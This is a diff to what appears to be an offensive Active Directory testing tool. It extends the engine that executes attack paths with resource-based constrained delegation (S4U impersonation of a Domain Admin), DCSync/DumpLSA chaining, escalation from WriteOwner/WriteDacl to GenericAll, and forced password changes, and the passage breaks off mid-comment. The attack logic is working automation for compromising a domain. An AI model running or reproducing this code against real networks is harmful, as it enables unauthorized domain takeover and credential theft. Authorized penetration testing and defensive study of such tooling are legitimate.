@@ -39,7 +39,10 @@ from adscan_internal import (
 )
 from adscan_internal.interaction import is_non_interactive
 from adscan_internal.reporting_compat import load_optional_report_service_attr
-from adscan_internal.passwords import generate_strong_password, is_password_complex
+from adscan_internal.passwords import (
+    generate_compliant_password,
+    validate_against_policy,
+)
 from adscan_internal.rich_output import (
     BRAND_COLORS,
     mark_sensitive,
@@ -82,6 +85,9 @@ from adscan_internal.cli.ace_step_execution import (
     get_last_ace_execution_outcome,
     resolve_execution_user as _shared_resolve_execution_user,
 )
+from adscan_internal.cli.control_escalation import (
+    ensure_control_to_wield_next_edge,
+)
 from adscan_internal.cli.attack_step_followups import (
     build_followups_for_execution_outcome,
     build_followups_for_step,
@@ -101,6 +107,7 @@ from adscan_internal.services.ldap_transport_service import (
     prepare_kerberos_ldap_environment,
 )
 from adscan_internal.services.attack_step_catalog import (
+    build_step_knowledge,
     relation_counts_for_execution_readiness,
     relation_requires_execution_context,
 )
@@ -651,6 +658,25 @@ def persist_attack_path_snapshot(
             steps = (
                 summary.get("steps") if isinstance(summary.get("steps"), list) else []
             )
+            # Enrich each step with a self-describing ``knowledge`` sub-object
+            # (canonical technique prose — description/impact/remediation/
+            # remediation_options/references — pulled from VULN_CATALOG via the
+            # step's ``vuln_key`` join, plus edge-specific step_summary,
+            # remediation_steps, narrative, and mitre_*). The ``vuln_key`` is the
+            # unification join back to the matching finding.
+            # Steps without a catalog entry carry no ``knowledge`` key. Build
+            # enriched copies so the shared summary objects are not mutated.
+            enriched_steps: list[Any] = []
+            for raw_step in steps:
+                if not isinstance(raw_step, dict):
+                    enriched_steps.append(raw_step)
+                    continue
+                step_copy = dict(raw_step)
+                knowledge = build_step_knowledge(raw_step)
+                if knowledge:
+                    step_copy["knowledge"] = knowledge
+                enriched_steps.append(step_copy)
+            steps = enriched_steps
             snapshot_paths.append(
                 {
                     "id": str(
@@ -666,6 +692,16 @@ def persist_attack_path_snapshot(
                     "is_tier_zero": _summary_target_priority_class(summary)
                     == "tierzero",
                     "target_priority_class": _summary_target_priority_class(summary),
+                    # Canonical compromise class stamped by
+                    # ``apply_path_based_classification`` (CompromiseClass.value);
+                    # serialized so the web consumes it directly instead of
+                    # re-deriving the class with brittle string matching. ``None``
+                    # when the record carries no class.
+                    "compromise_class": (
+                        str(summary.get("compromise_class"))
+                        if summary.get("compromise_class")
+                        else None
+                    ),
                     "nodes": [str(node or "") for node in nodes],
                     "relations": [str(relation or "") for relation in relations],
                     "steps": steps,
@@ -2014,6 +2050,12 @@ def _attack_path_step_readiness_reason(
     elif step_key == "allowedtodelegate":
         if not (from_label and to_label):
             return "missing delegation endpoints"
+    elif step_key == "allowedtoact":
+        # Inbound RBCD: from_label is the trustee (often a group), to_label is
+        # the target computer whose msDS-AllowedToActOnBehalfOfOtherIdentity
+        # grants delegation. The target is the load-bearing endpoint.
+        if not to_label:
+            return "missing RBCD target"
     elif step_key == "writelogonscript":
         domain_data = (
             getattr(shell, "domains_data", {}).get(domain, {})
@@ -2254,6 +2296,11 @@ def _attack_path_step_has_executable_context(
         )
     if step_key == "allowedtodelegate":
         return bool(from_label and to_label)
+    if step_key == "allowedtoact":
+        # Target endpoint is the load-bearing requirement; the handler resolves
+        # the owned SPN-bearing trustee member at execution time and reports a
+        # precise failure when none is available.
+        return bool(to_label)
     if step_key == "writelogonscript":
         domain_data = (
             getattr(shell, "domains_data", {}).get(domain, {})
@@ -2787,15 +2834,22 @@ def _resolve_execution_user(
     context_username: str | None,
     summary: dict[str, object],
     from_label: str | None,
+    host: str | None = None,
     max_options: int = 20,
 ) -> str | None:
-    """Resolve an execution user for attack steps that require credentials."""
+    """Resolve an execution user for attack steps that require credentials.
+
+    Pass ``host`` for a NETWORK-authenticating step (SMB/WinRM/RDP/MSSQL) so a
+    principal already denied a network logon on that host is deprioritized in
+    favour of a logon-capable one. Omit it for TGT/AS-REQ/scoped-ticket flows.
+    """
     return _shared_resolve_execution_user(
         shell,
         domain=domain,
         context_username=context_username,
         summary=summary,
         from_label=from_label,
+        host=host,
         max_options=max_options,
     )
 
@@ -2898,6 +2952,227 @@ def _resolve_domain_password(shell: object, domain: str, username: str) -> str |
     if not isinstance(value, str) or not value:
         return None
     return value
+
+
+def _resolve_owned_spn_member_for_rbcd(
+    shell: object, *, domain: str, trustee_label: str
+) -> str | None:
+    """Resolve an owned, SPN-bearing principal that is a member of the RBCD
+    trustee (the grantee in the target's msDS-AllowedToActOnBehalfOfOtherIdentity).
+
+    Computer accounts (sAMAccountName ending ``$``) always carry a host SPN
+    usable as the S4U2Proxy delegating identity. The prior AddMember step in the
+    chain places such a controlled account into the trustee group, so we prefer
+    an owned computer account confirmed (incl. runtime adds) as a member of
+    ``trustee_label``; when membership cannot be confirmed we fall back to the
+    (usually single) owned computer account and let the S4U surface the precise
+    DC rejection if it is not actually a member. Returns the sAMAccountName, or
+    ``None`` when no owned computer account exists.
+    """
+    domain_data = (getattr(shell, "domains_data", {}) or {}).get(domain, {}) or {}
+    creds = domain_data.get("credentials", {}) or {}
+    owned_machines = sorted(
+        {
+            str(u).strip()
+            for u in creds.keys()
+            if isinstance(u, str) and str(u).strip().endswith("$") and len(str(u).strip()) > 1
+        },
+        key=str.lower,
+    )
+    if not owned_machines:
+        return None
+    owned_sams = {m.split("@", 1)[0].strip().lower() for m in owned_machines}
+    trustee_sam = str(trustee_label or "").split("@", 1)[0].strip().lower()
+
+    # Prefer a confirmed member of the trustee group (best-effort; includes the
+    # runtime AddMember the previous step performed).
+    try:
+        from adscan_internal.services.attack_graph_service import (  # noqa: PLC0415
+            _build_recursive_membership_closure,
+            _load_membership_snapshot,
+        )
+
+        snapshot = _load_membership_snapshot(shell, domain)
+        closure = (
+            _build_recursive_membership_closure(domain, snapshot) if snapshot else {}
+        )
+        for principal_label, groups in (closure or {}).items():
+            p_sam = str(principal_label).split("@", 1)[0].strip().lower()
+            if p_sam not in owned_sams:
+                continue
+            if any(
+                str(g).split("@", 1)[0].strip().lower() == trustee_sam
+                for g in (groups or ())
+            ):
+                for machine in owned_machines:
+                    if machine.split("@", 1)[0].strip().lower() == p_sam:
+                        return machine
+    except Exception as exc:  # noqa: BLE001 — membership confirmation is best-effort
+        telemetry.capture_exception(exc)
+
+    return owned_machines[0]
+
+
+def _print_allowedtoact_blocked_panel(
+    *, trustee_label: str, target_label: str, reason: str, next_step: str
+) -> None:
+    """Premium explanation of why an AllowedToAct (RBCD) step cannot run.
+
+    The operator must understand the exploitation requirement, not just see a
+    failure: RBCD needs a controlled SPN-bearing principal that is (or can be
+    added as) a member of the trustee, AND whose long-term secret we hold (a
+    ccache is not enough — the S4U2Self ticket has to be re-forged forwardable).
+    """
+    from adscan_internal.rich_output import print_panel  # noqa: PLC0415
+
+    lines = [
+        f"Target (RBCD):  {mark_sensitive(target_label or '?', 'node')}",
+        f"Trustee:        {mark_sensitive(trustee_label or '?', 'node')}",
+        "",
+        f"Why it cannot run now:  {reason}",
+        "",
+        "Resource-based constrained delegation (AllowedToAct) is minted by a",
+        "controlled principal that:",
+        "  1. is — or can be added as — a member of the trustee above, and",
+        "  2. has a Service Principal Name (computer accounts always do; a user",
+        "     needs one, addable via WriteSPN when you control the account), and",
+        "  3. whose long-term secret (password / NT hash) you hold — a ccache",
+        "     alone is not enough: the S4U2Self ticket is re-forged forwardable",
+        "     with the account key.",
+        "",
+        f"To unlock it:  {next_step}",
+    ]
+    print_panel(
+        "\n".join(lines),
+        title="🎫 AllowedToAct (RBCD) — cannot execute yet",
+        border_style="yellow",
+        expand=False,
+    )
+
+
+def _print_st_logon_denied_panel(
+    *, principal: str, host: str, attempt: int, is_dc: bool
+) -> None:
+    """Premium card: a minted ST principal was denied a network logon → re-select.
+
+    Recoverable (border yellow): the loop caches the denial and re-prompts. The
+    operator must understand this is a User-Rights-Assignment hardening, not a
+    missing privilege — and that the cached principal is now excluded everywhere.
+    """
+    from adscan_internal.rich_output import print_panel  # noqa: PLC0415
+
+    masked_p = mark_sensitive(principal, "user")
+    masked_h = mark_sensitive(host, "hostname")
+    recovery = (
+        "the DC machine account, which can always network-logon to itself, "
+        "or another Domain Admin"
+        if is_dc
+        else "another privileged account permitted to log on to this host"
+    )
+    lines = [
+        f"Host:       {masked_h}",
+        f"Principal:  {masked_p}   (attempt {attempt})",
+        "",
+        "The target DENIED this principal a network logon",
+        "(STATUS_LOGON_TYPE_NOT_GRANTED). This is a 'Deny access to this",
+        "computer from the network' right (SeDenyNetworkLogonRight) in the",
+        "host's User Rights Assignment / GPO — NOT a privilege the principal",
+        "lacks, and NOT readable from any LDAP attribute, so it can only be",
+        "learned by trying. The service ticket was minted fine; the host just",
+        "refuses to honour it for a network logon.",
+        "",
+        f"Cached for {masked_h}:  {masked_p} will not be offered again here, in",
+        "this or any other service-ticket flow.",
+        "",
+        f"Re-selecting now — choose {recovery}.",
+    ]
+    print_panel(
+        "\n".join(lines),
+        title="🚫 Network logon denied — re-selecting impersonation target",
+        border_style="yellow",
+        expand=False,
+    )
+
+
+def _print_st_logon_exhausted_panel(
+    *, host: str, denied_principals: list[str], is_dc: bool
+) -> None:
+    """Premium card: every eligible principal was denied a network logon → halt.
+
+    Terminal for this step (border red): the ST can be minted but never used on
+    this host, so the chained DCSync/DumpLSA cannot run.
+    """
+    from adscan_internal.rich_output import print_panel  # noqa: PLC0415
+
+    masked_h = mark_sensitive(host, "hostname")
+    tried = "\n".join(
+        f"  - {mark_sensitive(p, 'user')}" for p in denied_principals
+    ) or "  (none selected)"
+    next_step = (
+        "compromise a principal the host's User Rights Assignment permits to "
+        "log on (the host's own machine account always can), or target a "
+        "different host"
+    )
+    lines = [
+        f"Host:  {masked_h}",
+        "",
+        "Tried — all denied a network logon (SeDenyNetworkLogonRight):",
+        tried,
+        "",
+        "Every eligible privileged principal was refused a network logon on",
+        "this host. The service ticket can be minted but not used here, so the",
+        "chained step (DCSync / DumpLSA) cannot run.",
+        "",
+        f"Next:  {next_step}.",
+    ]
+    print_panel(
+        "\n".join(lines),
+        title="⛔ No principal can authenticate to this host",
+        border_style="red",
+        expand=False,
+    )
+
+
+def _probe_ticket_network_logon(
+    *, domain: str, target_ip: str, target_fqdn: str, kdc_ip: str, ccache_path: str
+) -> tuple[bool, str | None]:
+    """Cheap SMB session_setup probe: does this minted ticket grant a NETWORK
+    logon to the target?
+
+    Ground truth for the case an LDAP attribute cannot tell us: a principal may
+    hold the privilege (e.g. replication) yet the target denies it a network
+    logon (STATUS_LOGON_TYPE_NOT_GRANTED via SeDenyNetworkLogonRight). We detect
+    it BEFORE chaining the consuming step. Returns ``(ok, status_text)``:
+    ``(True, None)`` when a session is established; ``(False, <error>)`` on any
+    auth/connect failure (the caller classifies whether it is a logon-type
+    denial worth caching vs a transient error).
+    """
+    import asyncio  # noqa: PLC0415
+
+    from adscan_internal.services.smb_transport import (  # noqa: PLC0415
+        SMBConfig,
+        smb_machine_for,
+    )
+
+    async def _run() -> tuple[bool, str | None]:
+        cfg = SMBConfig(
+            target_ip=target_ip,
+            target_hostname=target_fqdn or None,
+            domain=domain,
+            kdc_ip=kdc_ip or target_ip,
+            ccache_path=ccache_path,
+            use_kerberos=True,
+        )
+        try:
+            async with smb_machine_for(cfg):
+                return True, None
+        except Exception as exc:  # noqa: BLE001 — any failure is a non-ok probe
+            return False, str(exc)
+
+    try:
+        return asyncio.run(_run())
+    except Exception as exc:  # noqa: BLE001
+        return False, str(exc)
 
 
 def _resolve_workspace_dir(shell: Any, domain: str) -> str:
@@ -3131,6 +3406,15 @@ def _prepare_kerberos_for_smb_execution(
 
     is_ccache_credential = str(credential or "").strip().lower().endswith(".ccache")
     dc_ip = str(domain_data.get("pdc") or "").strip() or None
+
+    # CARVE-OUT — capability-bearing / scoped-ticket axis. An operator-supplied
+    # ``.ccache`` may be an ESC13 PAC-injected TGT or an S4U2Proxy/RBCD service
+    # ticket whose principal legitimately differs from ``username`` and whose
+    # power lives ONLY in that ccache. It must be used AS-IS — re-minting via
+    # ``ensure_user_ccache`` would drop the synthetic group SID / scope. The
+    # operator context is already bound into the env by
+    # ``prepare_kerberos_ldap_environment`` above; preserve it and proceed with
+    # Kerberos rather than regenerating credentials.
     if is_ccache_credential:
         print_warning_debug(
             "[writelogonscript] Kerberos ccache appears invalid before SMB operation; "
@@ -3138,37 +3422,62 @@ def _prepare_kerberos_for_smb_execution(
             f"credentials for {mark_sensitive(username, 'user')} in "
             f"{mark_sensitive(domain, 'domain')}"
         )
-    else:
-        print_warning_debug(
-            "[writelogonscript] Kerberos ticket appears expired before SMB operation; "
-            f"refreshing ticket for {mark_sensitive(username, 'user')} in "
-            f"{mark_sensitive(domain, 'domain')}"
-        )
-    auto_generate = getattr(shell, "_auto_generate_kerberos_ticket", None)
-    if not callable(auto_generate):
         return True
+
+    # GENERIC branch — password / NT hash for ``username``. Mint a per-user TGT
+    # via the SSOT ``ensure_user_ccache`` (posture-aware: AES etypes + salt) and
+    # bind the env to THAT ccache. Never return ``use_kerberos=True`` while the
+    # env still points at the ambient $KRB5CCNAME (a different principal's TGT —
+    # the DA after a DCSync); on mint failure fall back to NTLM so the SMB step
+    # authenticates as the intended principal, not whoever's ticket is active.
+    print_warning_debug(
+        "[writelogonscript] Kerberos ticket expired/absent before SMB operation; "
+        f"minting per-user ticket for {mark_sensitive(username, 'user')} in "
+        f"{mark_sensitive(domain, 'domain')}"
+    )
+    from adscan_internal.services.kerberos_ticket_service import ensure_user_ccache
+
     try:
-        refreshed = auto_generate(username, credential, domain, dc_ip)
-        if not refreshed:
-            return True
-        return prepare_kerberos_ldap_environment(
-            operation_name=f"{operation_name} (ticket refresh)",
-            target_domain=domain,
-            workspace_dir=workspace_dir,
-            username=str(username),
-            user_domain=str(domain),
-            domains_data=getattr(shell, "domains_data", {}),
-            sync_clock=getattr(shell, "do_sync_clock_with_pdc", None),
+        minted = ensure_user_ccache(
+            shell,
+            user=str(username),
+            domain=str(domain),
+            credential=(str(credential).strip() or None)
+            if credential is not None
+            else None,
+            dc_ip=dc_ip,
         )
     except Exception as exc:  # noqa: BLE001
         telemetry.capture_exception(exc)
         print_warning_debug(
-            "[writelogonscript] Kerberos ticket refresh failed before SMB operation; "
+            "[writelogonscript] Kerberos ticket mint failed before SMB operation; "
+            "falling back to NTLM. "
             f"user={mark_sensitive(username, 'user')} "
             f"domain={mark_sensitive(domain, 'domain')} "
             f"error={mark_sensitive(str(exc), 'text')}"
         )
-        return True
+        return False
+
+    if not str(minted or "").strip():
+        # No per-user ticket could be produced. Do NOT return True with the
+        # ambient env ccache — fall back to NTLM (or a blocked step downstream).
+        print_warning_debug(
+            "[writelogonscript] no per-user Kerberos ticket for "
+            f"{mark_sensitive(username, 'user')}; falling back to NTLM (refusing "
+            "the ambient $KRB5CCNAME principal)"
+        )
+        return False
+
+    # Bind the env to the freshly minted per-user ccache.
+    return prepare_kerberos_ldap_environment(
+        operation_name=f"{operation_name} (ticket refresh)",
+        target_domain=domain,
+        workspace_dir=workspace_dir,
+        username=str(username),
+        user_domain=str(domain),
+        domains_data=getattr(shell, "domains_data", {}),
+        sync_clock=getattr(shell, "do_sync_clock_with_pdc", None),
+    )
 
 
 def _execute_writelogonscript_precheck(
@@ -3541,7 +3850,14 @@ def _execute_writelogonscript_force_change_password_strategy(
         )
 
     non_interactive = is_non_interactive(shell)
-    generated_password = _generate_strong_password(16)
+    fcp_policy = _resolve_password_policy_for_execution(
+        shell,
+        domain=domain,
+        target_user=next_target_user,
+        username=exec_username,
+        password=password,
+    )
+    generated_password = generate_compliant_password(fcp_policy, machine=False)
     selected_password = generated_password
     if not non_interactive:
         selected_password = (
@@ -3551,7 +3867,8 @@ def _execute_writelogonscript_force_change_password_strategy(
             ).strip()
             or generated_password
         )
-    if not _is_password_complex(selected_password):
+    policy_ok, _policy_unmet = validate_against_policy(selected_password, fcp_policy)
+    if not policy_ok:
         return (
             "blocked",
             {
@@ -4256,14 +4573,116 @@ def _generate_default_hassession_username() -> str:
     return f"adscan{stamp}{suffix}"[:20]
 
 
-def _generate_strong_password(length: int = 12) -> str:
-    """Backward-compatible wrapper around centralized password generation."""
-    return generate_strong_password(length)
+def _resolve_password_policy_for_execution(
+    shell: Any,
+    *,
+    domain: str,
+    target_user: str | None,
+    username: str | None,
+    password: str | None,
+) -> Any:
+    """Resolve the resultant password policy for a password-setting step (live-first).
+
+    Mirrors the call shape used by the interactive ForceChangePassword Gate-1
+    (:func:`adscan_internal.cli.exploits._resolve_fcp_password_policy`) and by
+    :func:`adscan_internal.services.exploitation.minted_account_identity`. The
+    centralized resolver is live-first, PSO-aware, and degrades to a strong safe
+    default when no live read is possible, so this never blocks the execution
+    engine - worst case it returns ``source="default_assumed"``.
+
+    Args:
+        shell: Active shell (provides ``domains_data`` and DC IP context).
+        domain: Target AD domain the new password will live in.
+        target_user: sAMAccountName of the account whose password is being set
+            (drives the per-user PSO read). ``None`` resolves the domain default.
+        username, password: Executor credential used to bind for the live read.
+
+    Returns:
+        A ``ResultantPasswordPolicy`` (never ``None``).
+    """
+    from adscan_internal.passwords import _default_strong_policy
+    from adscan_internal.services.posture_probe import (
+        resolve_resultant_password_policy,
+    )
+
+    domains_data = getattr(shell, "domains_data", {}) or {}
+    if not isinstance(domains_data, dict):
+        domains_data = {}
+    domain_data = domains_data.get(domain) or {}
+    dc_ip = resolve_dc_ip(domain_data) or str(domain_data.get("pdc") or "").strip()
+    if not dc_ip or not username or not password:
+        # No reachable DC IP or no usable bind credential: fall back to the
+        # strong safe default rather than fabricating a network call. The
+        # generator still produces a fully compliant password.
+        return _default_strong_policy()
+
+    looks_like_nt = bool(
+        password
+        and len(password) == 32
+        and all(c in "0123456789abcdefABCDEF" for c in password)
+    )
+    is_ccache = str(password or "").lower().endswith(".ccache")
+    try:
+        return run_async_sync(
+            resolve_resultant_password_policy(
+                domain=domain,
+                dc_ip=dc_ip,
+                target_user=target_user,
+                username=username,
+                password=None if (looks_like_nt or is_ccache) else password,
+                nt_hash=password if looks_like_nt else None,
+                ccache_path=password if is_ccache else None,
+                use_kerberos=is_ccache,
+                domains_data=domains_data,
+            )
+        )
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        print_info_debug(
+            "Could not resolve live domain password policy for the execution "
+            f"engine: {exc}. Falling back to the strong safe default."
+        )
+        return _default_strong_policy()
 
 
-def _is_password_complex(value: str) -> bool:
-    """Backward-compatible wrapper around centralized password validation."""
-    return is_password_complex(value)
+def _generate_policy_compliant_password(
+    shell: Any,
+    *,
+    domain: str,
+    target_user: str | None,
+    username: str | None,
+    password: str | None,
+    machine: bool = False,
+) -> str:
+    """Generate a password that satisfies the target's live (or default) policy.
+
+    Single entry point for every password-SETTING step in the execution engine
+    (ForceChangePassword, new domain-user creation). Routes through the canonical
+    policy-aware generator
+    (:func:`adscan_internal.passwords.generate_compliant_password`) so a domain
+    with ``minPwdLength`` above a fixed legacy length, or a fine-grained PSO,
+    never receives a non-compliant password.
+
+    Args:
+        shell: Active shell (DC IP + credential context).
+        domain: Target AD domain.
+        target_user: Account whose password is being set (drives the PSO read).
+        username, password: Executor bind credential for the live policy read.
+        machine: ``True`` for computer accounts (machine length floor + forced
+            complexity); ``False`` for user accounts.
+
+    Returns:
+        A generated password guaranteed to pass ``validate_against_policy`` for
+        the resolved policy.
+    """
+    policy = _resolve_password_policy_for_execution(
+        shell,
+        domain=domain,
+        target_user=target_user,
+        username=username,
+        password=password,
+    )
+    return generate_compliant_password(policy, machine=machine)
 
 
 def _run_netexec_for_domain(
@@ -5942,6 +6361,22 @@ def execute_selected_attack_path(
             )
         return False
     # --- End boundary enforcement ---
+
+    # SSOT physical clock-sync guard: ensure the host clock is fresh-synced to
+    # the DC (and host NTP held off) BEFORE any step dispatch. The per-request
+    # kerbad clock-skew offset covers AS/TGS, but PKINIT / U2U / shadow-creds
+    # chains reached from here need a physically-stepped clock. Idempotent +
+    # best-effort: a NOOP within +/-120s, never blocks execution on failure.
+    try:
+        from adscan_internal.models.domain import resolve_dc_ip
+        from adscan_internal.services.dc_time import do_ensure_clock_synced_fresh
+
+        _domain_data = (getattr(shell, "domains_data", {}) or {}).get(domain) or {}
+        _clock_dc_ip = resolve_dc_ip(_domain_data)
+        if _clock_dc_ip:
+            do_ensure_clock_synced_fresh(shell, domain, _clock_dc_ip)
+    except Exception:  # noqa: BLE001 — clock guard must never block execution
+        pass
 
     set_attack_path_execution(shell)
     # Surface any HasSession artifact left by a previous crashed run before
@@ -7662,6 +8097,40 @@ def execute_selected_attack_path(
                     print_warning(f"Cannot execute {action}: missing from/to details.")
                     return execution_started
 
+                # RBCD chain coordination: when this write-to-group step feeds a
+                # downstream AllowedToAct whose trustee is this very group, the
+                # member to add must be an owned SPN-bearing account (the one the
+                # AllowedToAct will mint as), NOT the path-source executor — a
+                # member without an SPN cannot do S4U, so the RBCD would fail
+                # KDC_ERR_BADOPTION. Resolve it via the shared helper so both the
+                # AddMember and the AllowedToAct steps agree on the same principal.
+                # AddSelf is excluded (it can only add the executor itself).
+                rbcd_member_to_add: str | None = None
+                if key in {"genericall", "genericwrite", "addmember"} and to_label:
+                    _next_step = steps[idx] if idx < len(steps) else None
+                    if isinstance(_next_step, dict):
+                        _next_action = str(_next_step.get("action") or "").strip().lower()
+                        _next_details = (
+                            _next_step.get("details")
+                            if isinstance(_next_step.get("details"), dict)
+                            else {}
+                        )
+                        _next_from = str(_next_details.get("from") or "").strip()
+                        if (
+                            _next_action == "allowedtoact"
+                            and _next_from.upper() == to_label.strip().upper()
+                        ):
+                            rbcd_member_to_add = _resolve_owned_spn_member_for_rbcd(
+                                shell, domain=domain, trustee_label=to_label
+                            )
+                            if rbcd_member_to_add:
+                                print_info_debug(
+                                    "[rbcd-coord] next step is AllowedToAct on group "
+                                    f"{mark_sensitive(to_label, 'node')}; AddMember will add "
+                                    f"the SPN-bearing account "
+                                    f"{mark_sensitive(rbcd_member_to_add, 'user')}"
+                                )
+
                 exec_context = build_ace_step_context(
                     shell,
                     domain,
@@ -7671,6 +8140,7 @@ def execute_selected_attack_path(
                     to_label=to_label,
                     context_username=context_username,
                     context_password=context_password,
+                    member_to_add=rbcd_member_to_add,
                 )
                 if not exec_context:
                     marked_from = mark_sensitive(from_label, "node")
@@ -7838,7 +8308,76 @@ def execute_selected_attack_path(
                             notes={"user": exec_context.exec_username},
                         )
 
-                        ace_result = execute_ace_step(shell, context=exec_context)
+                        # Intermediate control-to-wield: when an
+                        # owner/DACL-grant step is NOT the terminal step and the
+                        # next edge is sourced from this very object, granting
+                        # control is not enough — the executor must escalate to
+                        # effective GenericAll and WIELD it so the next step runs
+                        # as the now-correct principal. The grant-only stubs for
+                        # writeowner/writedacl otherwise leave the next step
+                        # authenticating as the wrong principal -> the
+                        # insufficientAccessRights bug on chains like
+                        # WriteOwner(group) -> the group's outbound edge.
+                        # genericall/genericwrite already wield inline (untouched)
+                        # and writedacl->domain stays a same-principal two-edge
+                        # DCSync sequence (target_kind=="domain" excluded below).
+                        _ctw_next_edge = steps[idx] if idx < len(steps) else None
+                        _ctw_intermediate = idx != last_executable_idx
+                        # target_kind is the graph node's RAW kind — PascalCase
+                        # ("Group"/"User"/"Computer"/"Domain"). Normalize before the
+                        # gate (every other ACE comparison uses .lower()). Comparing
+                        # the PascalCase value against a lowercase set made this gate
+                        # ALWAYS-False, so the ladder never fired for any real path
+                        # (the WriteOwner-on-group → insufficientAccessRights bug).
+                        _ctw_target_kind = str(exec_context.target_kind or "").strip().lower()
+                        _ctw_will_fire = (
+                            key in {"writeowner", "writedacl"}
+                            and _ctw_intermediate
+                            and _ctw_target_kind in {"user", "group", "computer"}
+                            and isinstance(_ctw_next_edge, dict)
+                        )
+                        # Bracket-free marker (Rich-markup rule) so a future non-fire
+                        # is greppable instead of silently falling to the legacy path.
+                        print_info_debug(
+                            "control-escalation gate: "
+                            f"relation={key} intermediate={_ctw_intermediate} "
+                            f"target_kind={_ctw_target_kind or 'unknown'} "
+                            f"next_edge={'present' if isinstance(_ctw_next_edge, dict) else 'none'} "
+                            f"will_fire={_ctw_will_fire}"
+                        )
+                        if _ctw_will_fire:
+                            _ctw = ensure_control_to_wield_next_edge(
+                                shell,
+                                exec_context=exec_context,
+                                control_relation=key,
+                                to_label=to_label,
+                                next_edge=_ctw_next_edge,
+                            )
+                            # Every rung drove execute_ace_step, so the executor
+                            # already left the richer outcome on the shell (group
+                            # -> group_membership_changed; user/computer -> the
+                            # real produced credential). Do NOT synthesize an
+                            # outcome here — the unified handoff below threads it.
+                            if _ctw.escalated:
+                                # A fired ladder counts as success only if its
+                                # inline wield SUCCEEDED (group AddMember /
+                                # user|computer GenericAll abuse). An attempted-
+                                # but-failed wield marks the step FAILED so the
+                                # chain stops instead of advancing against a
+                                # non-member / uncompromised principal. Targets
+                                # with no inline wield (domain/OU) have
+                                # attempted_wield=False -> success on the rung alone.
+                                ace_result = _ctw.wielded or not _ctw.attempted_wield
+                            else:
+                                # Ladder could not escalate -> fall back to the
+                                # legacy grant-only execution (no worse than before).
+                                ace_result = execute_ace_step(
+                                    shell, context=exec_context
+                                )
+                        else:
+                            ace_result = execute_ace_step(
+                                shell, context=exec_context
+                            )
                         last_outcome = get_last_ace_execution_outcome(shell) or {}
                         _apply_execution_outcome_context_handoff(last_outcome)
                         register_cleanup_from_outcome(
@@ -10691,7 +11230,19 @@ def execute_selected_attack_path(
                         )
                         return execution_started
 
-                    generated_password = _generate_strong_password(12)
+                    # New account does not exist yet (no per-user PSO), so resolve
+                    # the domain-default policy (target_user=None) and generate a
+                    # compliant password through the canonical generator.
+                    new_user_policy = _resolve_password_policy_for_execution(
+                        shell,
+                        domain=domain,
+                        target_user=None,
+                        username=exec_username,
+                        password=password,
+                    )
+                    generated_password = generate_compliant_password(
+                        new_user_policy, machine=False
+                    )
                     if non_interactive:
                         selected_password = generated_password
                     else:
@@ -10699,10 +11250,14 @@ def execute_selected_attack_path(
                             "Password for the new domain user",
                             default=generated_password,
                         ).strip()
-                    if not _is_password_complex(selected_password):
+                    policy_ok, policy_unmet = validate_against_policy(
+                        selected_password, new_user_policy
+                    )
+                    if not policy_ok:
                         print_warning(
-                            "Cannot execute HasSession: password must be at least "
-                            "12 chars and include lower/upper/digit/symbol."
+                            "Cannot execute HasSession: the chosen password does not "
+                            "satisfy the domain password policy "
+                            f"({'; '.join(policy_unmet) or 'complexity/length'})."
                         )
                         return execution_started
                     target_user = selected_user
@@ -11312,6 +11867,282 @@ def execute_selected_attack_path(
                     break
                 continue
 
+            if key == "allowedtoact":
+                # Inbound RBCD. from_label is the trustee (often a group) granted
+                # delegation by the target's msDS-AllowedToActOnBehalfOfOtherIdentity;
+                # to_label is the target computer. We mint as an owned, SPN-bearing
+                # member of the trustee (placed there by the prior AddMember step),
+                # impersonating a Domain Admin, to obtain a service-ticket family on
+                # the target. Structurally SPNJack without the SPN-relocation phase.
+                if not to_label:
+                    print_warning("Cannot execute AllowedToAct: missing RBCD target.")
+                    return execution_started
+
+                member_user = _resolve_owned_spn_member_for_rbcd(
+                    shell, domain=domain, trustee_label=from_label
+                )
+                if not member_user:
+                    _print_allowedtoact_blocked_panel(
+                        trustee_label=from_label,
+                        target_label=to_label,
+                        reason=(
+                            "No owned, SPN-bearing principal is a member of the "
+                            "trustee, so there is nothing that can run S4U against "
+                            "the target."
+                        ),
+                        next_step=(
+                            "compromise a computer account (or an account with an "
+                            "SPN) that belongs to the trustee, or gain write access "
+                            "to the trustee group to add one."
+                        ),
+                    )
+                    _mark_blocked_step(
+                        action, from_label, to_label, kind="unavailable",
+                        reason="No owned SPN-bearing trustee member",
+                    )
+                    return execution_started
+
+                member_secret = _resolve_domain_password(shell, domain, member_user)
+                _member_is_ccache_only = False
+                if member_secret:
+                    try:
+                        from adscan_internal.services.pivot_auth_context_service import (  # noqa: PLC0415
+                            _looks_like_ccache,
+                        )
+                        _member_is_ccache_only = _looks_like_ccache(member_secret)
+                    except Exception:  # noqa: BLE001
+                        _member_is_ccache_only = False
+                if not member_secret or _member_is_ccache_only:
+                    reason = (
+                        "the only stored credential for "
+                        f"{mark_sensitive(member_user, 'user')} is a Kerberos ccache, "
+                        "but RBCD must re-forge the S4U2Self ticket forwardable with "
+                        "the account's long-term key (password / NT hash)."
+                        if _member_is_ccache_only
+                        else f"no stored credential for {mark_sensitive(member_user, 'user')}."
+                    )
+                    _print_allowedtoact_blocked_panel(
+                        trustee_label=from_label,
+                        target_label=to_label,
+                        reason=reason,
+                        next_step=(
+                            f"recover {mark_sensitive(member_user, 'user')}'s password "
+                            "or NT hash (e.g. via the account's own compromise path)."
+                        ),
+                    )
+                    _mark_blocked_step(
+                        action, from_label, to_label, kind="unavailable",
+                        reason=(
+                            "Trustee member credential is ccache-only (no long-term key)"
+                            if _member_is_ccache_only
+                            else "Missing stored credential for trustee member"
+                        ),
+                    )
+                    return execution_started
+
+                from adscan_internal.services._kerberos_spn import (  # noqa: PLC0415
+                    normalize_kerberos_target_hostname,
+                )
+                target_samname = str(to_label).split("@", 1)[0].strip()
+                short_host = target_samname.rstrip("$")
+                target_fqdn = (
+                    normalize_kerberos_target_hostname(short_host, domain)
+                    or f"{short_host}.{domain}".lower()
+                )
+                domain_data = shell.domains_data.get(domain, {})
+                dc_ip = resolve_dc_ip(domain_data) or ""
+                try:
+                    from adscan_internal.services.domain_posture import (  # noqa: PLC0415
+                        get_posture,
+                    )
+                    posture_snapshot = get_posture(shell.domains_data, domain=domain)
+                except Exception:  # noqa: BLE001
+                    posture_snapshot = None
+
+                # Impersonation target + logon recovery. For an RBCD against a DC,
+                # the DC's OWN machine account is the proven DCSync path (it holds
+                # replication rights AND can always network-logon to itself); a
